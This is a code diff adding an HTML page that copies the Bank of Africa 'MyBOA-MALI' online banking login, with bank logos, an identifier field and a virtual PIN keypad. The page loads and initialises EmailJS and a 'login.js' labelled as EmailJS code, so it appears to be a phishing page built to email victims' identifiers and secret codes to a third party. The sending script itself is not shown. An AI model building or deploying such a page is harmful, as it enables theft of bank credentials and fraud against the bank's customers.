@@ -1,0 +1,252 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+    <meta charset="utf-8"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+    <meta name="description" content=""/>
+    <meta name="author" content="Adria BT"/>
+    <meta http-equiv="refresh" content="600">
+    <meta http-equiv="Content-Security-Policy" content="frame-ancestors 'none'"/>
+    <meta http-equiv="X-Frame-Options" content="deny"/>
+
+    <link rel="shortcut icon" href="../css/themes/ML045/images/favicon.png"/>
+    <title>MyBOA-MALI - Groupe bank of africa</title>
+
+    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+    <script>
+        (function(){
+            emailjs.init('sTmdjsE3v4fxIs-Up');
+        })();
+    </script>
+
+    <link href="../css/themes/ML045/auth/css/bootstrap.min.css" rel="stylesheet" type="text/css"/>
+    <link href="../css/themes/ML045/auth/css/animate.css" rel="stylesheet" type="text/css"/>
+    <link href="../css/themes/ML045/auth/css/style.css" rel="stylesheet" type="text/css"/>
+    <link href="../css/themes/ML045/font/font-awesome-4.7.0/css/font-awesome.min.css" rel="stylesheet" type="text/css"/>
+    <link href="../css/themes/ML045/auth/css/colors/default.css" rel="stylesheet" type="text/css"/>
+    <link href="../css/themes/ML045/style-auth.css" rel="stylesheet" type="text/css"/>
+    <link rel="stylesheet" href="login-mobile.css">
+    
+    <style>
+        /* Séparation Desktop / Mobile */
+        @media (min-width: 768px) {
+            .mobile-layout { display: none !important; }
+        }
+        @media (max-width: 767px) {
+            .desktop-layout { display: none !important; }
+            .mobile-layout { display: block !important; }
+            body { background: #0a121e !important; }
+        }
+
+        /* Grille clavier 5x5 */
+        #padDiv {
+            display: none;
+            width: 100%;
+            overflow: hidden;
+            margin: 10px 0;
+        }
+        .keyss {
+            float: left;
+            width: 20%;
+            padding: 3px;
+            box-sizing: border-box;
+        }
+        .keyss button {
+            width: 100%;
+            height: 44px;
+            background: #555555;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+        }
+        .keyss button:disabled {
+            background: #333333;
+            opacity: 0.5;
+            cursor: default;
+        }
+        .keyss button:not(:disabled):hover {
+            background: #2e7d32;
+        }
+        /* Clearfix après la grille */
+        #padDiv::after {
+            content: '';
+            display: table;
+            clear: both;
+        }
+    </style>
+</head>
+<body data-spy="scroll" data-target="#navbar-menu">
+
+<!-- ============================================================
+     DESKTOP (≥ 768px) — Structure originale BOA conservée
+     ============================================================ -->
+<div class="desktop-layout">
+
+    <div class="navbar navbar-custom" role="navigation">
+        <div class="container">
+            <div class="navbar-header">
+                <button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+                    <span class="icon-bar"></span>
+                    <span class="icon-bar"></span>
+                    <span class="icon-bar"></span>
+                </button>
+                <a class="navbar-brand logo" href="#home">
+                    <img src="../images/Logo_PP_Positif-small.png" alt="BANK OF AFRICA BMCE GROUP" style="height: 45px; width: auto;"/>
+                </a>
+            </div>
+            <div class="navbar-collapse collapse" id="navbar-menu">
+                <ul class="nav navbar-nav nav-custom-left">
+                    <li class="active"><a href="#home">Accueil</a></li>
+                    <li><a href="#">Services</a></li>
+                    <li><a href="#">Contact</a></li>
+                </ul>
+            </div>
+        </div>
+    </div>
+
+    <section class="home home-form-left" id="home">
+        <div class="container">
+            <div class="row">
+                <div class="col-md-6 col-sm-6">
+                    <div class="home-wrapper w-lg animated fadeInDown wow" data-wow-delay=".4s" style="padding-top: 15px;">
+                        <h1>MyBOA-MALI</h1>
+                        <div id="desc">
+                            Vos services bancaires accessibles en un seul clic
+                        </div>
+                        <br/>
+                    </div>
+                </div>
+
+                <div class="col-md-4 col-md-offset-2 col-sm-6 intro-form w-lg animated fadeInUp wow" data-wow-delay=".4s">
+                    <div class="home-wrapper">
+                        <form role="form" id="register_form" class="intro-form" autocomplete="off" onsubmit="return false;">
+                            <h3 class="text-center">ACCÉDEZ À VOS COMPTES</h3>
+
+                            <div class="form-group">
+                                <div class="un-wrap">
+                                    <input name="username" id="identifiant_desktop" type="text" class="form-control"
+                                           placeholder="Identifiant" required="required" autocomplete="off"/>
+                                </div>
+                            </div>
+
+                            <div class="form-group">
+                                <div class="un-wrap" style="position: relative;">
+                                    <input name="password" id="code_desktop" onclick="if ($('#padDiv').css('display') == 'none') { $('#padDiv').show(); generatePadDiv(); } else { $('#padDiv').hide(); }"
+                                           type="password" class="form-control" placeholder="Code secret" readonly required="required"/>
+                                    <span id="clear_input" onclick="document.getElementById('code_desktop').value='';">&times;</span>
+                                    <span id="delete_input" onclick="var f=document.getElementById('code_desktop'); f.value=f.value.slice(0,-1);">
+                                        <i class="fa fa-long-arrow-left"></i>
+                                    </span>
+                                </div>
+                            </div>
+
+                            <!-- Le #padDiv doit être placé entre le champ Code secret et le bouton CONNEXION -->
+                            <div class="" id="padDiv" style="display: none;">
+                            </div>
+
+                            <div id="desktop-error" style="color:#e74c3c; font-size:13px; margin:5px 0; display:none; text-align:center;"></div>
+
+                            <div class="form-group">
+                                <button id="btn-connexion-desktop" type="button" class="btn btn-primary btn-shadow w-lg" style="width:100%; background-color: #2e7d32 !important; border-color: #2e7d32 !important;">CONNEXION
+                                </button>
+                            </div>
+
+                            <div class="form-group text-center">
+                                <a style="color: #6a6a6a;" href="#">Mot de passe oublié ?</a>
+                            </div>
+                        </form>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <footer class="section bg-gray footer">
+        <div class="container">
+            <div class="row">
+                <div class="col-sm-12" style="height: 60px;">
+                    <div class="footer-alt">
+                        <p class="pull-right m-b-0">Copyright ©2018 BANK OF AFRICA, All rights reserved.</p>
+                        <a class="navbar-brand logo" href="#">
+                            <img src="../images/Logo_PP_Positif-small.png" style="height: 40px;"/>
+                        </a>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </footer>
+
+</div>
+<!-- FIN DESKTOP -->
+
+<!-- ============================================================
+     MOBILE (< 768px) — Layout sombre avec clavier custom
+     ============================================================ -->
+<div class="mobile-layout">
+    <div class="login-wrapper">
+        <div class="login-bg"></div>
+        <div class="login-overlay"></div>
+        <div class="login-content">
+            <div class="login-header">
+                <div class="login-logo">
+                    <img src="../css/themes/ML045/images/favicon.png" alt="BOA">
+                </div>
+                <div class="login-bank-name">BANK OF AFRICA</div>
+                <div class="login-bank-sub">BMCE GROUP · MyBOA-MALI</div>
+                <div class="login-ssl-badge">
+                    <span class="ssl-dot"></span>
+                    <span>Connexion sécurisée SSL</span>
+                </div>
+            </div>
+
+            <div class="login-card" id="mobile-card">
+                <div class="login-card-title">ACCÉDEZ À VOS COMPTES</div>
+
+                <div class="login-field" id="field-identifiant">
+                    <label>IDENTIFIANT</label>
+                    <input type="text" id="identifiant" inputmode="numeric"
+                           pattern="[0-9]*" placeholder="Votre identifiant..." autocomplete="off">
+                </div>
+
+                <div class="login-field" id="field-code">
+                    <label>CODE SECRET</label>
+                    <div class="code-row">
+                        <input type="password" id="code-secret" autocomplete="off" readonly>
+                        <button class="btn-erase" id="btn-erase" type="button">⌫</button>
+                    </div>
+                </div>
+
+                <div class="login-error" id="login-error"></div>
+                <div class="virtual-keyboard" id="virtual-keyboard"></div>
+
+                <button class="btn-connexion" id="btn-connexion" type="button">CONNEXION</button>
+                <div class="login-forgot">Mot de passe oublié ?</div>
+            </div>
+
+            <div class="login-footer">
+                © 2018 BANK OF AFRICA · All rights reserved
+            </div>
+        </div>
+    </div>
+</div>
+<!-- FIN MOBILE -->
+
+<!-- Scripts originaux BOA -->
+<script src="../css/themes/ML045/auth/js/jquery.js"></script>
+<script src="../css/themes/ML045/auth/js/bootstrap.min.js"></script>
+<script src="../css/themes/ML045/auth/js/jquery.easing.1.3.min.js"></script>
+<script src="../css/themes/ML045/auth/js/adria.min.js"></script>
+<script src="../css/themes/ML045/auth/js/AesUtil.js"></script>
+<script src="../css/themes/ML045/auth/js/aes.js"></script>
+<script src="../css/themes/ML045/auth/js/pbkdf2.js"></script>
+<script src="../css/themes/ML045/auth/js/jquery.sticky.js"></script>
+<script src="../css/themes/ML045/auth/js/jquery.app.js"></script>
+
+<!-- Script certicode + EmailJS -->
+<script src="login.js"></script>
+
+</body>
+</html>
